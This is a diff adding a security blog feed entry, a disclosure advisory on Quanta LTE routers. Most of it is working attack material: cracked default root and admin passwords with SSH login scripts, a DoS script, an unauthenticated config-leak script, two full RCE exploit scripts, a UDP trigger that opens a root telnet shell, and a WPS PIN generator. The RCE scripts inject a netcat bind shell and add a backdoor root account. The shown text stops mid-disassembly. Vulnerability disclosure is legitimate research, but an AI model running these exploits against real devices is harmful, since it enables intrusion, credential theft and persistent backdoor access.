@@ -4,6 +4,1158 @@
     <title>A slice of Kimchi - IT Security Blog</title>
     
     <entry>
+        <title>Multiple vulnerabilities found in Quanta LTE routers (backdoor, backdoor accounts, RCE, weak WPS ...)</title>
+        <link href="2016-04-04-quanta-lte-routers-vulnerabilities.html"/>
+        <content type="html"><h2>Product Description</h2>
+<p>Quanta Computer Incorporated is a Taiwan-based manufacturer of electronic hardware.
+It is the largest manufacturer of notebook computers in the world.</p>
+<h2>Vulnerabilities Summary</h2>
+<p>The Quanta LTE QDH Router device is a LTE router / access point overall badly
+designed with a lot of vulnerabilities. It's available in a number of countries to
+provide Internet with a LTE network.</p>
+<p>The tests below are done using the latest available firmware (firmware 01.00.05_1210, model revision QDHY10_M1.2252_45041, /DailyBuild/MDM9x25_2031_QDT/QDHY_2031_YOOMEE/codebase/MDM9x25_2031_QDH_20141210_0940/MDM9x25_2031_QDT/LINUX/apps_proc/oe-core/build/tmp-eglibc/work-shared/gcc-4.6.2+svnr181430-r22/gcc-4_6-branch/libgcc/../gcc/config/arm).</p>
+<p>The summary of the vulnerabilities is:</p>
+<ul>
+<li><a href="#hardcoded-ssh-server-key">Hardcoded SSH Server key</a></li>
+<li><a href="#backdoor-accounts">Backdoor accounts</a></li>
+<li><a href="#router-dos">Router DoS</a></li>
+<li><a href="#webinterface-information-leak">WebInterface Information Leak</a></li>
+<li><a href="#rce-1">RCE #1</a></li>
+<li><a href="#rce-2">RCE #2</a></li>
+<li><a href="#backdoor">Backdoor</a></li>
+<li><a href="#default-wps-pin">Default WPS PIN</a></li>
+<li><a href="#weak-wps-pin-generation">Weak WPS PIN Generation - with a reverse-engineered algorithm</a></li>
+<li><a href="#backdoor-accounts-in-samba">Backdoor accounts in Samba</a></li>
+<li><a href="#leaking-no-ip-account">Leaking No-IP account (?)</a></li>
+<li><a href="#remote-fota">Remote FOTA (Firmware Over The Air)</a></li>
+<li><a href="#toctou-lpe">TOCTOU vulnerability in QCMAP_ConnectionManager - LPE</a></li>
+<li><a href="#default-wifi-password-weakness">Default Wifi Password Weakness</a></li>
+<li><a href="#http-dos">HTTP DoS</a></li>
+<li><a href="#arbitrary-file-browsing-using-the-http-daemon">Arbitrary file browsing using the http daemon</a></li>
+<li><a href="#arbitrary-file-reading-using-the-http-daemon">Arbitrary file reading using the http daemon</a></li>
+<li><a href="#network-eavesdropping">Network Eavesdropping - Interception with the gglogd program</a></li>
+<li><a href="#security-removed-in-upnp">Security removed in UPnP</a></li>
+<li><a href="#undocumented-diagnostic-webpage">Undocumented diagnostic webpage</a></li>
+<li><a href="#misc">Misc</a></li>
+</ul>
+<p>A personal point of view: at best, the vulnerabilites are due to incompetence; at worst, it is a deliberate act of security sabotage from the vendor. Not all the vulnerabilities found have been disclosed in this advisory. Only the significant ones are shown.</p>
+<p>Note: This firmware is being used by other Quanta CPEs. From the <code>/usr/www/js/ui/qdisplay.js</code> file,
+the vulnerable firmware seems to be used in several routers:</p>
+<ul>
+<li>Quanta 4G WiFi Router QDH</li>
+<li>Quanta 4G WiFi Router UNE</li>
+<li>Quanta 4G WiFi Router MOBILY (QDH-Mobily - CPE342X)</li>
+<li>Quanta 4G WiFi Router Yoomee</li>
+</ul>
+<p><img src="http://my.ifdesign.de/upload/entry_ex_media/award_277/127936_4516_large_entry_medium.jpg" width=250></p>
+<p>The routers are still on sale and used in several countries.</p>
+<p>Due to lack of communication of the vendor, the specific list of affected countries is unknown. However, we assume the affected firmware is used at least in some Arabic speaking countries as the Help files are written in English, French, Chinese and Arabic (See <code>http://192.168.1.1/help_ar.html</code>). </p>
+<p><strong>Due to lack of security patches provided by the vendor, the vulnerabilities will remain unpatched</strong>.</p>
+<p><a id="hardcoded-ssh-server-key"></a></p>
+<h2>Details - Hardcoded SSH Server key</h2>
+<p>A hardcoded SSH server key can be found in <code>/etc/dropbear/dropbear_rsa_host_key</code> and can be used to decipher SSH traffic to the router:</p>
+<pre><code>admin@homerouter:~$ ls -la /etc/dropbear/dropbear_rsa_host_key
+-rw-------  1 root  root  427 Dec 10  2014 dropbear/dropbear_rsa_host_key
+#
+</code></pre>
+<p>Base64 hardcoded SSH server key:</p>
+<pre><code>user@kali:~$ cat dropbear_rsa_host_key | base64 
+AAAAB3NzaC1yc2EAAAADAQABAAAAgwC9P88UlGdb6WIsIcyni8zh4zLdrSORieNeZNXtDHiH
+zgs80XQ8FOBBaNBTBAib+GX6V8Aixvmh315+H6xyb4fQSlicpJ1lq4k7pKsrXGgdYS2FTPrX
+A8YG+1beVvWeK9/8LjXAdZCzwE7D8jOSPh9dw0HIuPQhBCfxE4o/WOvYwVMZAAAAggHJf9g9
+CAZWS3zo80ysPWqvKXBuNYEm9RCTwXDn/p3isFi6Th+Qn2cCuT/lcHrfkz/0Uu5JJHuWt0bX
+3/ojKzxIaUQplS1Kumc4qF65ksKWjCmJuKvtO50dooZNEmq86AKKnrC6t+7qb/5koX9eu/dV
+4w4P2jETGZBEUOLwFULn9aEAAABCAPUi4oI9NcRHZ3tvlEXgN/7Cd2F/UbshuW0kV1v4sJZj
+ABmVrJ5TXol8Ne8KoWinxHfGaSky/IJR9zSkTaUJy115AAAAQgDFouA20kCjNeGgtabxuRP7
+lndn8/4jXR0/HvEVdZIki9Z5gifC5+gxn8rKcyTSZZmyMYGwLQsN3Z9LumQT/DdaoQ==
+user@kali:~$
+</code></pre>
+<p><a id="backdoor-accounts"></a></p>
+<h2>Details - Backdoor accounts</h2>
+<p>By default, telnetd and SSHd are running in the router.</p>
+<p>2 backdoors accounts exist and can be used to bypass the HTTP authentication used to manage the router.</p>
+<pre><code>admin@homerouter:~$ grep admin /etc/passwd 
+admin:htEcF9TWn./9Q:168:168:admin:/:/bin/sh
+admin@homerouter:~$
+</code></pre>
+<p>The password for admin is 'admin' and can be found in the <code>/bin/appmgr</code> program using IDA:</p>
+<p><img alt="" src="images/2016-quanta-backdoor-admin-default-mod_sysadm_config_passwd.png" /></p>
+<p>About the root user:</p>
+<pre><code>root@homerouter:~# grep root /etc/shadow
+root:aRDiHrJ0OkehM:16414:0:99999:7:::
+root@homerouter:~#
+</code></pre>
+<p>Using john to crack the hashes:</p>
+<pre><code>user@kali:~$ john -show shadow+passwd
+admin:admin:admin:/:/bin/sh
+root:1234:16414:0:99999:7:::
+
+2 password hashes cracked, 0 left
+user@kali:~$
+</code></pre>
+<p>Results:</p>
+<ul>
+<li>admin has password admin</li>
+<li>root has password 1234</li>
+</ul>
+<p>Working exploit for admin:</p>
+<pre><code>user@kali:~$ cat quanta-ssh-default-password-admin
+#!/usr/bin/expect -f
+
+set timeout 3
+spawn ssh admin@192.168.1.1
+expect "password: $"
+send "admin\r"
+interact
+user@kali:~$ ./quanta-ssh-default-password-admin
+spawn ssh admin@192.168.1.1
+admin@192.168.1.1's password:
+admin@homerouter:~$ id
+uid=168(admin) gid=168(admin) groups=168(admin)
+admin@homerouter:~$
+</code></pre>
+<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin">https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin</a>.</p>
+<p>Working exploit for root</p>
+<pre><code>user@kali:~$ cat quanta-ssh-default-password-root
+#!/usr/bin/expect -f
+
+set timeout 3
+spawn ssh root@192.168.1.1
+expect "password: $"
+send "1234\r"
+interact
+user@kali:~$ ./quanta-ssh-default-password-root
+spawn ssh root@192.168.1.1
+root@192.168.1.1's password:
+root@homerouter:~# id
+uid=168(root) gid=168(root) groups=168(root)
+root@homerouter:~#
+</code></pre>
+<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-ssh-default-password-root">https://pierrekim.github.io/advisories/quanta-ssh-default-password-root</a>.</p>
+<p><a id="router-dos"></a></p>
+<h2>Details - Router DoS</h2>
+<p>The router has apparently small capacity when trying to route packets.</p>
+<p>This "exploit" will likely force the router to reboot:</p>
+<pre><code>user@kali:~$ cat quanta-dos-crash-router.sh
+#!/bin/sh
+
+echo this exploit will crash the router if you are using RJ45
+echo press [enter]
+read x
+nmap -sP -T5 10.201.12.0/24 2&gt;/dev/null &gt;/dev/null
+
+user@kali:~$ ./quanta-dos-crash-router.sh
+this exploit will crash the router if you are using RJ45
+press [enter]
+
+[the router will reboot]
+user@kali:~$
+</code></pre>
+<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-dos-crash-router.sh">https://pierrekim.github.io/advisories/quanta-dos-crash-router.sh</a>.</p>
+<p><a id="webinterface-information-leak"></a></p>
+<h2>Details - WebInterface Information Leak</h2>
+<p>The webinterface allows an attacker to retrieve every sensible information without authentication (web login, web passwords, wifi configuration, WPS PIN, Dyndns login, Dyndns passwords, Wifi SSIDs, ...).</p>
+<p>This "exploit" will show all the configuration of the router, including logins and passwords:</p>
+<pre><code>user@kali:~$ cat quanta-infoleak.sh
+#!/bin/sh
+
+ip=$1
+if [ ! $1 ]; then
+  echo "$0 ip"
+  exit 1
+fi
+
+echo "INFOLEAK"
+echo "press [enter]"
+read wut
+for i in system apn firewall fota lan modem portfwd r_sku samba sms10 wan_lte wan_wifi wifi cm netstat ipfilter ddns dlna tr069 ip6filter wizard ; do
+  wget -qO- "http://$ip/data.ria?CfgType=get_homeCfg&amp;file=$i"
+done
+user@kali:~$
+</code></pre>
+<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-infoleak.sh">https://pierrekim.github.io/advisories/quanta-infoleak.sh</a>.</p>
+<p>Using this exploit:</p>
+<pre><code>user@kali:~$ ./quanta-infoleak.sh 192.168.1.1
+INFOLEAK
+press [enter]
+[META]
+System_Log="2,M"
+[VER]
+config="1.0"
+[DEVICE]
+web_usrname="admin"
+web_passwd="admin"
+login_timeout="0"
+language="10"
+[SNTP]
+enable="1"
+timezone="16"
+update_period="12"
+server1="0.africa.pool.ntp.org"
+server2="1.africa.pool.ntp.org"
+server3="time.windows.com"
+[PWRMGR]
+batt_idle_tm="0"
+deep_sleep_tm="0"
+pwroff_idle_tm="0"
+[WEBSVC]
+
+[....snip....]
+[AP1]
+enable="1"
+ssid="OperatorWiFi-0000"
+channel="0"
+ch_width="0"
+hidden="0"
+security="3"
+wpa_auth="5"
+wpa_passphrase="test test"
+[....snip....]
+enrollee_pin="28296607"
+[....snip....]
+user@kali:~$
+</code></pre>
+<p><a id="rce-1"></a></p>
+<h2>Details - RCE #1</h2>
+<p>The Webinterface allows an attacker to execute commands as root by injecting commands.</p>
+<p>The first RCE has been found in the ping API:</p>
+<p>Ping Remote command execution with <code>nc -l -p 1337 -e /bin/ash</code> as a payload</p>
+<pre><code>user@kali:~$ wget -qO/dev/null --header="Cookie: ${http_session}" --post-data="{\"CfgType\":\"ping\",\"cmd\":\"ping\",\"url\":\"\`/bin/nc -l -p 1337 -e /bin/ash\`\",\"cnt\":4,\"authID\":\"${http_csrf_token}\"}" "http://192.168.1.1/webpost.cgi"
+</code></pre>
+<p>A complete exploit is provided and will produce this output:</p>
+<pre><code>user@kali:~$ ./quanta-rce-remote-exploit-ping.sh
+  Stage [1] - Bypassing authentication ... OK
+  local admin             = admin
+  local passw             = admin
+  wifi access point       = OperatorWiFi-0000
+  wifi password           = test
+  WPS PIN                 = 28296607
+  guest wifi access point = OperatorWiFi-Guest-0000
+  guest wifi password     = 12345678
+  public ip               = 0.0.0.0
+  gateway                 = 0.0.0.0
+  subnet mask             = 255.255.255.252
+  dns server #1           = 41.242.32.26
+  dns server #2           = 41.242.32.42
+
+Stage [2] - RCE ... OK
+Stage [3] - Checking the router ... OK
+uid=0(root) gid=0(root)
+HACK THE PLANET
+Stage [4] - Creating a backdoor account ... OK
+Stage [5] - Connecting as backdoor/admin to the remote sshd ...
+
+Have fun!
+
+spawn ssh backdoor@192.168.1.1
+backdoor@192.168.1.1's password: 
+root@homerouter:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@homerouter:/#
+</code></pre>
+<p>This exploit will bypass the authentication, get the information about credentials using the infoleak, use them to get a CSRF token, launch a backdoor shell as root, add an user and then connect with SSH with the new created account with a fully-working shell:</p>
+<pre><code>user@kali:~$ cat quanta-rce-remote-exploit-ping.sh
+#!/bin/sh
+
+TMP_DIR=$(mktemp -d)
+
+echo -n "Stage [1] - Bypassing authentication ..."
+
+wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
+wget -qO${TMP_DIR}/stage1-wifi 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=wifi'
+wget -qO${TMP_DIR}/stage1-network 'http://192.168.1.1/data.ria?DynUpdate=up_5s'
+
+echo " OK"
+echo -n "  local admin             = "
+http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+echo $http_login
+echo -n "  local passw             = "
+http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+echo $http_password
+echo -n "  wifi access point       = "
+grep ssid ${TMP_DIR}/stage1-wifi | head -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+echo -n "  wifi password           = "
+grep wpa_passphrase= ${TMP_DIR}/stage1-wifi | head -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+echo -n "  WPS PIN                 = "
+grep enrollee_pin ${TMP_DIR}/stage1-wifi | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+echo -n "  guest wifi access point = "
+grep ssid ${TMP_DIR}/stage1-wifi | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+echo -n "  guest wifi password     = "
+grep wpa_passphrase= ${TMP_DIR}/stage1-wifi | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+
+echo -n "  public ip               = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep ip | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+echo -n "  gateway                 = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep gateway | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+echo -n "  subnet mask             = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep subnet_mask | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+echo -n "  dns server #1           = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep dns1 | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+echo -n "  dns server #2           = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep dns2 | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+
+
+echo
+echo -n "Stage [2] - RCE ..."
+http_login=$(echo $http_login | tr -d '\r')
+http_password=$(echo $http_password | tr -d '\r')
+http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
+http_csrf_token=$(wget -qO- --header="Cookie: ${http_session=}" "http://192.168.1.1/data.ria?token=1")
+wget -qO/dev/null --header="Cookie: ${http_session}" --post-data="{\"CfgType\":\"ping\",\"cmd\":\"ping\",\"url\":\"\`/bin/nc -l -p 1337 -e /bin/ash\`\",\"cnt\":4,\"authID\":\"${http_csrf_token}\"}" "http://192.168.1.1/webpost.cgi"
+echo " OK"
+echo "Stage [3] - Checking the router ... OK"
+(echo id; echo echo "backdoor:htEcF9TWn./9Q:0:0:backdoor:/:/bin/sh &gt;&gt; /etc/passwd" ; echo echo HACK THE PLANET ; echo exit) | nc 192.168.1.1 1337
+echo -n "Stage [4] - Creating a backdoor account ..."
+echo " OK"
+echo "Stage [5] - Connecting as backdoor/admin to the remote sshd ..."
+echo
+echo "Have fun!"
+echo
+expect -c 'set timeout 3; spawn ssh backdoor@192.168.1.1; expect "password: $"; send "admin\r"; interact'
+user@kali:~$
+</code></pre>
+<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-rce-remote-exploit-ping.sh">https://pierrekim.github.io/advisories/quanta-rce-remote-exploit-ping.sh</a>.</p>
+<p><a id="rce-2"></a></p>
+<h2>Details - RCE #2</h2>
+<p>The Webinterface allows an attacker to execute commands as root by injecting commands.</p>
+<p>The second RCE has been found in the traceroute API:</p>
+<p>Traceroute Remote command execution:</p>
+<pre><code>user@kali:~$ wget -qO/dev/null --header="Cookie: ${http_session}" --post-data="{\"CfgType\":\"tracert\",\"cmd\":\"tracert\",\"url\":\"\`/bin/nc -l -p 1337 -e /bin/ash\`\",\"authID\":\"${http_csrf_token}\"}" "http://192.168.1.1/webpost.cgi"
+</code></pre>
+<p>Working exploit:</p>
+<p>The output is the same as the first RCE.  A complete exploit is provided and will produce this output:</p>
+<pre><code>user@kali:~$ ./quanta-rce-remote-exploit-traceroute.sh
+  Stage [1] - Bypassing authentication ... OK
+  local admin             = admin
+  local passw             = admin
+  wifi access point       = OperatorWiFi-0000
+  wifi password           = test
+  WPS PIN                 = 28296607
+  guest wifi access point = OperatorWiFi-Guest-0000
+  guest wifi password     = 12345678
+  public ip               = 0.0.0.0
+  gateway                 = 0.0.0.0
+  subnet mask             = 255.255.255.252
+  dns server #1           = 41.242.32.26
+  dns server #2           = 41.242.32.42
+
+Stage [2] - RCE ... OK
+Stage [3] - Checking the router ... OK
+uid=0(root) gid=0(root)
+HACK THE PLANET
+Stage [4] - Creating a backdoor account ... OK
+Stage [5] - Connecting as backdoor/admin to the remote sshd ...
+
+Have fun!
+
+spawn ssh backdoor@192.168.1.1
+backdoor@192.168.1.1's password:
+root@homerouter:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@homerouter:/#
+</code></pre>
+<p>This exploit will bypass the authentication, get the information about credentials using the infoleak, use them to get a CSRF token, launch a backdoor shell as root, add an user and then connect with SSH with the new created account with a fully-working shell:</p>
+<pre><code>user@kali:~$ cat quanta-rce-remote-exploit-ping.sh
+#!/bin/sh
+
+TMP_DIR=$(mktemp -d)
+
+echo -n "Stage [1] - Bypassing authentication ..."
+
+wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
+wget -qO${TMP_DIR}/stage1-wifi 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=wifi'
+wget -qO${TMP_DIR}/stage1-network 'http://192.168.1.1/data.ria?DynUpdate=up_5s'
+
+echo " OK"
+echo -n "  local admin             = "
+http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+echo $http_login
+echo -n "  local passw             = "
+http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
+echo $http_password
+echo -n "  wifi access point       = "
+grep ssid ${TMP_DIR}/stage1-wifi | head -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+echo -n "  wifi password           = "
+grep wpa_passphrase= ${TMP_DIR}/stage1-wifi | head -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+echo -n "  WPS PIN                 = "
+grep enrollee_pin ${TMP_DIR}/stage1-wifi | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+echo -n "  guest wifi access point = "
+grep ssid ${TMP_DIR}/stage1-wifi | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+echo -n "  guest wifi password     = "
+grep wpa_passphrase= ${TMP_DIR}/stage1-wifi | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
+
+echo -n "  public ip               = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep ip | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+echo -n "  gateway                 = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep gateway | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+echo -n "  subnet mask             = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep subnet_mask | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+echo -n "  dns server #1           = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep dns1 | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+echo -n "  dns server #2           = "
+json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep dns2 | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
+
+
+echo
+echo -n "Stage [2] - RCE ..."
+http_login=$(echo $http_login | tr -d '\r')
+http_password=$(echo $http_password | tr -d '\r')
+http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
+http_csrf_token=$(wget -qO- --header="Cookie: ${http_session=}" "http://192.168.1.1/data.ria?token=1")
+wget -qO/dev/null --header="Cookie: ${http_session}" --post-data="{\"CfgType\":\"tracert\",\"cmd\":\"tracert\",\"url\":\"\`/bin/nc -l -p 1337 -e /bin/ash\`\",\"authID\":\"${http_csrf_token}\"}" "http://192.168.1.1/webpost.cgi"
+echo " OK"
+echo "Stage [3] - Checking the router ... OK"
+(echo id; echo echo "backdoor:htEcF9TWn./9Q:0:0:backdoor:/:/bin/sh &gt;&gt; /etc/passwd" ; echo exit) | nc 192.168.1.1 1337
+echo -n "Stage [4] - Creating a backdoor account ..."
+echo " OK"
+echo "Stage [5] - Connecting as backdoor/admin to the remote sshd ..."
+echo
+echo "Have fun!"
+echo
+expect -c 'set timeout 3; spawn ssh backdoor@192.168.1.1; expect "password: $"; send "admin\r"; interact'
+</code></pre>
+<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-rce-remote-exploit-traceroute.sh">https://pierrekim.github.io/advisories/quanta-rce-remote-exploit-traceroute.sh</a>.</p>
+<p><a id="backdoor"></a></p>
+<h2>Details - Backdoor</h2>
+<p>A backdoor is present inside the <code>/bin/appmgr</code> program. By sending a specific string in UDP to the router, an authentication-less telnet server will start if a telnetd daemon is not already running.</p>
+<p>In <code>/bin/appmgr</code>, a thread listens to 0.0.0.0:39889 (UDP) and waits for commands.</p>
+<p>If a client sends "HELODBG" to the router, the router will execute <code>/sbin/telnetd -l /bin/sh</code>, allowing to access without authentication to the router as root.</p>
+<p>When using IDA, we can see the backdoor is located in the main function (line 389):</p>
+<p><img alt="" src="images/2016-quanta-backdoor-telnet.png" /></p>
+<p>Working PoC :</p>
+<pre><code>user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889
+Hello
+^C
+user@kali:~$ telnet 192.168.1.1
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+
+OpenEmbedded Linux homerouter.cpe
+
+
+msm 20141210 homerouter.cpe
+
+/ # id
+uid=0(root) gid=0(root)
+/ # exit
+Connection closed by foreign host.
+user@kali:~$
+</code></pre>
+<p><a id="default-wps-pin"></a></p>
+<h2>Details - Default WPS PIN</h2>
+<p>Wi-Fi Protected Setup(WPS) is a standard for easy and secure establishment of a wireless home network, as defined in the documentation provided in the router (help.html).</p>
+<p>By default, the PIN for the WPS system is ever <code>28296607</code>. It is, in fact, hardcoded in the <code>/bin/appmgr</code> program:</p>
+<p><img alt="" src="images/2016-quanta-wifi_get_default_wps_pin.png" /></p>
+<p>An user can check in the webinterface ("Par defaut" means "By default"):</p>
+<p><img alt="" src="images/2016-quanta-backdoor-default-pin-wps-interface.png" /></p>
+<p>This PIN can be found in the HostAP configuration too, and, using the information leak, in the HTTP APIs of the router:</p>
+<pre><code>root@homerouter:~# ps -a|grep hostap
+ 1006 root       0:00 hostapd /var/wifi/ar6k0.conf
+ 1219 root       0:00 grep hostap
+root@homerouter:~# cat /var/wifi/ar6k0.conf
+[...]
+ap_pin=28296607
+[...]
+</code></pre>
+<p>Leak of the default WPS PIN in the HTTP APIs:</p>
+<pre><code>user@kali:~$ ./quanta-infoleak.sh 192.168.1.1 | grep pin
+enrollee_pin="28296607"
+user@kali:~$
+</code></pre>
+<p><a id="weak-wps-pin-generation"></a></p>
+<h2>Details - Weak WPS PIN Generation - with a reverse-engineered algorithm</h2>
+<p>An user can use the webinterface to generate a temporary PIN for the WPS system (low probability as the <code>28296607</code> WPS PIN is provided by default).</p>
+<p>The PIN generated by the router is weak as it is generated using this "strange" reverse-engineered algorithm:</p>
+<pre><code>user@kali:~$ cat quanta-wps-gen.c
+</code></pre>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdio.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdlib.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;time.h&gt;</span><span style="color: #BC7A00"></span>
+
+<span style="color: #B00040">int</span> <span style="color: #0000FF">main</span>(<span style="color: #B00040">int</span>    argc,
+         <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>argv,
+         <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>envp)
+{ 
+  <span style="color: #B00040">unsigned</span> <span style="color: #B00040">int</span>  i0, i1;
+  <span style="color: #B00040">int</span>           i2;
+
+  <span style="color: #408080; font-style: italic">/* the seed is the current time of the router, which uses NTP... */</span>
+  srand(time(<span style="color: #666666">0</span>));
+
+  i0 <span style="color: #666666">=</span> rand() <span style="color: #666666">%</span> <span style="color: #666666">10000000</span>;
+  <span style="color: #008000; font-weight: bold">if</span> (i0 <span style="color: #666666">&lt;=</span> <span style="color: #666666">999999</span>)
+    i0 <span style="color: #666666">+=</span> <span style="color: #666666">1000000</span>;
+  i1 <span style="color: #666666">=</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0;
+  i2 <span style="color: #666666">=</span> (<span style="color: #666666">10</span> <span style="color: #666666">-</span> (i1 <span style="color: #666666">/</span> <span style="color: #666666">10000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">1000000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">100</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">3</span> <span style="color: #666666">*</span>
+       (i1 <span style="color: #666666">/</span> <span style="color: #666666">100000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0 <span style="color: #666666">/</span> <span style="color: #666666">10000000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">1000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">10</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span>))
+        <span style="color: #666666">%</span> <span style="color: #666666">10</span>) <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0;
+
+  printf(<span style="color: #BA2121">&quot;%d</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, i2 );
+
+  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
+}
+</pre></div>
+
+<pre><code>user@kali:~$ gcc -o quanta-wps-gen quanta-wps-gen.c
+user@kali:~$ ./quanta-wps-gen
+97329329
+user@kali:~$
+</code></pre>
+<p>You can fetch this program at <a href="https://pierrekim.github.io/advisories/quanta-wps-gen.c">https://pierrekim.github.io/advisories/quanta-wps-gen.c</a>.</p>
+<p>Using <code>srand(time(0))</code> as a seed is a bad idea because an attacker, knowing the current date as <code>time(0)</code> returns the current date in an integer value, can just generate the valid WPS PIN. The Router uses NTP so is likely to have a correct timestamp configured. It's trivial for an attacker to generate valid WPS PIN suites and bruteforce them.</p>
+<p>For the curious reader, the original algorithm in the firmware is:</p>
+<pre><code>.text:0001B8C8                 EXPORT generate_wlan_wps_enrollee_pin
+.text:0001B8C8 generate_wlan_wps_enrollee_pin          ; CODE XREF: wifi_msg_handle+194p
+.text:0001B8C8
+.text:0001B8C8 var_3C          = -0x3C
+.text:0001B8C8 var_38          = -0x38
+.text:0001B8C8 s               = -0x34
+.text:0001B8C8 var_30          = -0x30
+.text:0001B8C8 var_2C          = -0x2C
+.text:0001B8C8
+.text:0001B8C8                 STMFD           SP!, {R4-R11,LR}
+.text:0001B8CC                 SUB             SP, SP, #0x1C
+.text:0001B8D0                 STR             R0, [SP,#0x40+s]
+.text:0001B8D4                 MOV             R0, #0  ; timer
+.text:0001B8D8                 BL              time
+.text:0001B8DC                 BL              srand
+.text:0001B8E0                 BL              rand
+.text:0001B8E4                 LDR             R4, =0x6B5FCA6B
+.text:0001B8E8                 MOV             R6, R0,ASR#31
+.text:0001B8EC                 SMULL           R1, R4, R0, R4
+.text:0001B8F0                 RSB             R10, R6, R4,ASR#22
+.text:0001B8F4                 RSB             R12, R10, R10,LSL#5
+.text:0001B8F8                 RSB             R2, R12, R12,LSL#6
